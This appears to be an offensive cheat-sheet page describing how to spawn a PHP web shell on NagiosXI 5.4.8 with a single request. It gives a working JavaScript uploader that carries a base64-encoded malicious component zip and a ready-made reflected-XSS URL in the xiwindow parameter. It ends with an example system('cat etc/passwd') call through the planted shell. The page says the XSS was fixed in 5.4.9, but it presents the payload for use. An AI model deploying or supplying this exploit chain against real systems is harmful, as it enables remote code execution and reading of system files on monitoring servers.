# PHP shell spawn in a single request #
## This is working on NagiosXI 5.4.8 and may be on previous versions (I reported Reflected XSS used to spawn shell and it was fixed in 5.4.9) ##

If you are lazy enough for [building evil component](https://github.com/HD421/Monitoring-Systems-Cheat-Sheet/blob/master/php_shell_via_component_upload_NagiosXI.md) you can send single request and got your PHP shell. I'll show you DE WAY.
![de way](https://pbs.twimg.com/media/DS9eiy5WsAE4fVO.jpg)

## Creating javascript function for component uploading ##
```javascript
(function() {  var raw = window.atob('UEsDBAoAAAAAACF2CksAAAAAAAAAAAAAAAAMABwAc2hlbGxhY3Rpb24vVVQJAANdcoxZcXKMWXV4CwABBOgDAAAEZAAAAFBLAw QUAAAACADpdQpLAQDoCrkBAAASBAAAHwAcAHNoZWxsYWN0aW9uL3NoZWxsYWN0aW9uLmluYy5waHBVVAkAA/VxjFkfcoxZdXgLAAEE6AMAAAR kAAAArVNda9swFH2efsXFBGxD64/0g5CsG8ZzW0PqhMTdQ8sQmq06Akf2JLdQxv57JSVpsmLy1IsR+N57zrn3WP76vV21yPfVA3PGK4iKjjUc4mbdNpzyT hfipn0VrFp14BQuDIMwOFXHBWSkYo2EhHdUtIJJKk9gOo09iOoaDECCoJKKF1p6mgj0MUjLMcgVrWtitDzGC09NAeFouCEPw9NwpF7HZ8H4/PIBaEVq2Z ESBggJ+ueZCYobXlCnZIKTNXUwvk6nCcYueGD7nucXu/GVTEvFTsJ2JwgNDrTxeyPWRHAF1kHVmqD+XsZZ52gu/5PCuDy7m8+yJMshzdIcru+zOE9n2fLzR NDTM9983mNrob8IVFR185vUcMQttb9uHJRUFto5Zdc2Q0QlVYYIQV4dk9LxviDOorsErr7BPo7InPQQRPf57WxxSGF1VHZWX++PZBkv0rn2cgvAjun2wNI XxszfB8zTfPr/mJvL0a8S5R9WsoNzfzjy1Y2+tPsQP5PFcj+TQYReYJtOd+utoBWT6u/aW+Icc2rj/A7MnsBhUlKFwTdJ/mjjYl3av1zXVL/QF1J/qEzQP/QGUEsB Ah4DCgAAAAAAIXYKSwAAAAAAAAAAAAAAAAwAGAAAAAAAAAAQAO1BAAAAAHNoZWxsYWN0aW9uL1VUBQADXXKMWXV4CwABBOgDAAAEZAAA AFBLAQIeAxQAAAAIAOl1CksBAOgKuQEAABIEAAAfABgAAAAAAAEAAADtgUYAAABzaGVsbGFjdGlvbi9zaGVsbGFjdGlvbi5pbmMucGhwVVQFAAP1cYxZ dXgLAAEE6AMAAARkAAAAUEsFBgAAAAACAAIAtwAAAFgCAAAAAA=='); //our evil component shell.zip encrypted as base64
var rl = raw.length;
var u8a = new Uint8Array(rl);
for (var i = 0; i < rl; ++i)
    u8a[i] = raw.charCodeAt(i);
    var fd = new FormData();
    fd.append('uploadedfile', new Blob([u8a], {type: 'application/zip'}));
    fd.append('upload', 1); 
    fd.append('nsp', parent.window.nsp_str);      
var request = new XMLHttpRequest();  request.open("POST", "/nagiosxi/admin/components.php");
request.send(fd);) })();
```

## Optimizing payload ##
Now we are encrypting our JS function as base64 once more in order to execute the loading of the shell in one query. (We are exploiting Reflected XSS vulnerability in xiwindow parameter).
Also if you have access to administrative panel you can execute js function from previous step directly from your browser console.

```
*Your_HOST*/nagiosxi/config/?xiwindow=%20javascript:eval(atob(%27KGZ1bmN0aW9uKCkge3ZhciByYXc9d2luZG93LmF0b2IoJ1VFc0RCQW9BQUFBQUFDRjJDa3NBQUFBQUFBQUFBQUFBQUFBTUFCd0FjMmhsYkd4aFkzUnBiMjR2VlZRSkFBTmRjb3haY1hLTVdYVjRDd0FCQk9nREFBQUVaQUFBQUZCTEF3UVVBQUFBQ0FEcGRRcExBUURvQ3JrQkFBQVNCQUFBSHdBY0FITm9aV3hzWVdOMGFXOXVMM05vWld4c1lXTjBhVzl1TG1sdVl5NXdhSEJWVkFrQUEvVnhqRmtmY294WmRYZ0xBQUVFNkFNQUFBUmtBQUFBclZOZGE5c3dGSDJlZnNYRkJHeEQ2NC8wZzVDc0c4WnpXMFBxaE1UZFE4c1FtcTA2QWtmMkpMZFF4djU3SlNWcHNtTHkxSXNSK041N3pybjNXUDc2dlYyMXlQZlZBM1BHSzRpS2pqVWM0bWJkTnB6eVRoZmlwbjBWckZwMTRCUXVESU13T0ZYSEJXU2tZbzJFaEhkVXRJSkpLazlnT28wOWlPb2FERUNDb0pLS0YxcDZtZ2owTVVqTE1jZ1ZyV3RpdER6R0MwOU5BZUZvdUNFUHc5TndwRjdIWjhINC9QSUJhRVZxMlpFU0JnZ0ordWVaQ1lvYlhsQ25aSUtUTlhVd3ZrNm5DY1l1ZUdEN251Y1h1L0dWVEV2RlRzSjJKd2dORHJUeGV5UFdSSEFGMWtIVm1xRCtYc1paNTJndS81UEN1RHk3bTgreUpNc2h6ZEljcnUrek9FOW4yZkx6Uk5EVE05OTgzbU5yb2I4SVZGUjE4NXZVY01RdHRiOXVISlJVRnRvNVpkYzJRMFFsVllZSVFWNGRrOUx4dmlET29yc0VycjdCUG83SW5QUVFSUGY1N1d4eFNHRjFWSFpXWCsrUFpCa3Ywcm4yY2d2QWp1bjJ3TklYeHN6ZkI4elRmUHIvbUp2TDBhOFM1UjlXc29OemZ6ankxWTIrdFBzUVA1UEZjaitUUVlSZVlKdE9kK3V0b0JXVDZ1L2FXK0ljYzJyai9BN01uc0JoVWxLRndUZEovbWpqWWwzYXYxelhWTC9RRjFKL3FFelFQL1FHVUVzQkFoNERDZ0FBQUFBQUlYWUtTd0FBQUFBQUFBQUFBQUFBQUF3QUdBQUFBQUFBQUFBUUFPMUJBQUFBQUhOb1pXeHNZV04wYVc5dUwxVlVCUUFEWFhLTVdYVjRDd0FCQk9nREFBQUVaQUFBQUZCTEFRSWVBeFFBQUFBSUFPbDFDa3NCQU9nS3VRRUFBQklFQUFBZkFCZ0FBQUFBQUFFQUFBRHRnVVlBQUFCemFHVnNiR0ZqZEdsdmJpOXphR1ZzYkdGamRHbHZiaTVwYm1NdWNHaHdWVlFGQUFQMWNZeFpkWGdMQUFFRTZBTUFBQVJrQUFBQVVFc0ZCZ0FBQUFBQ0FBSUF0d0FBQUZnQ0FBQUFBQT09Jyk7dmFyIHJsPXJhdy5sZW5ndGg7dmFyIHU4YT1uZXcgVWludDhBcnJheShybCk7Zm9yKHZhciBpPTA7aTxybDsrK2kpdThhW2ldPXJhdy5jaGFyQ29kZUF0KGkpO3ZhciBmZD1uZXcgRm9ybURhdGEoKTtmZC5hcHBlbmQoJ3VwbG9hZGVkZmlsZScsbmV3IEJsb2IoW3U4YV0se3R5cGU6J2FwcGxpY2F0aW9uL3ppcCd9KSk7ZmQuYXBwZW5kKCd1cGxvYWQnLDEpO2ZkLmFwcGVuZCgnbnNwJyxwYXJlbnQud2luZG93Lm5zcF9zdHIpO3ZhciBycT1uZXcgWE1MSHR0cFJlcXVlc3QoKTtycS5vcGVuKCJQT1NUIiwiL25hZ2lvc3hpL2FkbWluL2NvbXBvbmVudHMucGhwIik7cnEuc2VuZChmZCk7fSkoKTsK%27))//
```

After this query you can access your shell like this (example: *your_host*/nagiosxi/admin?xiwindow=dashlets.php&_cmd=system('cat etc/passwd');)

![de way](https://camo.githubusercontent.com/8fe9aa429048d68def13737b28630f7a2adb3657/68747470733a2f2f696d6167652e70726e747363722e636f6d2f696d6167652f6f75494f535f4570547857516b6b346c4f6e446f66772e706e67)

## Feel free to use your shell homie. ##

research was made on NagiosXI 5.4.8
